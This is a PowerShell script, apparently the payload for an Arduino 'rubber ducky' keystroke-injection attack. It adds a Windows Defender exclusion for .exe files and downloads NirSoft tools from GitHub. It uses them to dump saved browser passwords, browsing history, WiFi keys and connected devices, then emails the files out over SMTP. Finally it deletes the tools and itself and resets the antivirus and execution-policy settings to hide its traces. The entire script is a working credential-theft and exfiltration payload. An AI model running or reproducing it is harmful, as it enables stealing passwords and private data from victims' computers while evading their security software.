Set-Location C:\Users\Public\Documents #Go to the folder in which we will donwload files
Add-MpPreference -ExclusionExtension exe -Force #Add exception for .exe files in antivirus

Invoke-WebRequest https://github.com/sd29i/Rubber-ducky-with-Arduino/blob/main/Tools/BrowsingHistoryView.exe?raw=true -OutFile BrowsingHistoryView.exe #Download the nirsoft tool for Browserhistory
Invoke-WebRequest https://github.com/sd29i/Rubber-ducky-with-Arduino/blob/main/Tools/WNetWatcher.exe?raw=true -OutFile WNetWatcher.exe #Download the nirsoft tool for connected devices
Invoke-WebRequest https://github.com/sd29i/Rubber-ducky-with-Arduino/blob/main/Tools/WebBrowserPassView.exe?raw=true -OutFile WebBrowserPassView.exe #Download the nirsoft tool for Browser passwords
Invoke-WebRequest https://github.com/sd29i/Rubber-ducky-with-Arduino/blob/main/Tools/WirelessKeyView.exe?raw=true -OutFile WirelessKeyView.exe #Download the nirsoft tool for WiFi passwords
.\WebBrowserPassView.exe /stext passwords.txt #Create the file for Browser passwords
.\BrowsingHistoryView.exe /VisitTimeFilterType 3 7 /stext history.txt #Create the file for Browser history
.\WirelessKeyView.exe /stext wifi.txt #Create the file for WiFi passwords
.\WNetWatcher.exe /stext connected_devices.txt #Create the file for connected devices

Start-Sleep -Seconds 60 #Wait for 60 seconds (because connected devices file take a minute to be created)

#Set mail option
$SMTPServer = 'smtp.office365.com'
$SMTPInfo = New-Object Net.Mail.SmtpClient($SmtpServer, 587)
$SMTPInfo.EnableSsl = $true
$SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('***YOUR EMAIL***', '***EMAIL PASSWORD***') #Email with which you want to send information
$ReportEmail = New-Object System.Net.Mail.MailMessage
$ReportEmail.From = '***YOUR EMAIL***' #Email in which you want to receice the information
$ReportEmail.To.Add('***YOUR EMAIL***') #Email in which you want to receive the information
$ReportEmail.Subject = 'Personal Credentials'
$ReportEmail.Body = 'Attached is your list of informations in text document.'
$ReportEmail.Attachments.Add('C:\Users\Public\Documents\passwords.txt')
$ReportEmail.Attachments.Add('C:\Users\Public\Documents\history.txt')
$ReportEmail.Attachments.Add('C:\Users\Public\Documents\wifi.txt')
$ReportEmail.Attachments.Add('C:\Users\Public\Documents\connected_devices.txt')
$SMTPInfo.Send($ReportEmail) #Send mail

Start-Sleep -Seconds 15 #Wait 15 seconds
Get-Process Powershell  | Where-Object { $_.ID -ne $pid } | Stop-Process #Kill all powershell process except the one running
Start-Sleep -Seconds 30 #Wait 30 seconds
#Delete nirsoft tools and .ps1 file
Remove-Item BrowsingHistoryView.exe
Remove-Item WNetWatcher.exe
Remove-Item WNetWatcher.cfg
Remove-Item WirelessKeyView.exe
Remove-Item WebBrowserPassView.exe
Remove-Item <your file name>.ps1

Remove-MpPreference -ExclusionExtension exe -Force #Reset antivirus exception
Remove-MpPreference -ExclusionExtension ps1 -Force #Reset antivirus exception
Set-ExecutionPolicy restricted -Force #Reset script blocker